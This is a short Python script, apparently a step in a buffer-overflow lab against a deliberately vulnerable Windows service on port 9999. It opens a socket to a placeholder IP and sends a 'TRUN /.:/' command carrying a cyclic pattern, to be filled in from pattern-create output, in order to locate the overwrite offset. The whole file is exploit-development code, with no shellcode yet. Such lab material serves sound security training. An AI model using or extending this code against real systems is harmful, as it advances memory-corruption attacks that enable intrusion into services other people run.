#!/usr/bin/python3
import socket
import sys

ip = "WINDOWS_IP"  #CHANGE_THIS
port = 9999

offset = b"REPLACE_THIS_WITH_PATTERN-CREATE_RESULT"        

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send(b"TRUN /.:/" + offset + b"\r\n")
    s.close()
    print("[+] Pattern sent")

except Exception as e:
    print("[!] Error:", e)
    sys.exit()

